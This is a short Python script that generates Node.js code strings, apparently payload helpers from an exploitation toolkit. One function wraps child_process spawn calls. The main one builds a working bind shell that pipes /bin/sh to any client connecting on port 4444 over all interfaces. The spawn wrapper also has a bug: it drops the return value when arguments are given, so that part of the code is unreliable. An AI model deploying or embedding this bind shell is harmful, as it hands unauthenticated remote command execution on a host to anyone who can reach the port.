def spawn_command_wrapper(cmd: str, args: list = None):
    """
        Constructs a JavaScript command string for spawning a child process.

        Parameters:
        - cmd: The command to execute.
        - args: Optional list of arguments for the command.

        Returns:
        A string with the JavaScript code to spawn a child process.
        """
    if args:
        js_args = ', '.join([f"'{arg}'" for arg in args])
        f"const {{ spawn }} = require('child_process'); spawn('{cmd}', [{js_args}]);"
    else:
        return f"const {{ spawn }} = require('child_process'); spawn('{cmd}');"


def get_bind_shell_command(port: int):
    """
        Returns the JavaScript code for the bindShell predefined script.

        Parameters:
        - port: The port number on which the bind shell should listen.
        """
    js_code = (
        "const net = require('net');"
        "const spawn = require('child_process').spawn;"
        "const server = net.createServer(function(socket) {{"
        "  const sh = spawn('/bin/sh', []);"
        "  socket.pipe(sh.stdin);"
        "  sh.stdout.pipe(socket);"
        "  sh.stderr.pipe(socket);"
        "}}).listen({port}, '0.0.0.0');"
    )
    return js_code.format(port=port)


js_command = spawn_command_wrapper('ls', ['-l', '/'])
bind_shell_js = get_bind_shell_command(4444)

print("JavaScript command to spawn a process:\n", js_command)
print("\nJavaScript code for bindShell script:\n", bind_shell_js)
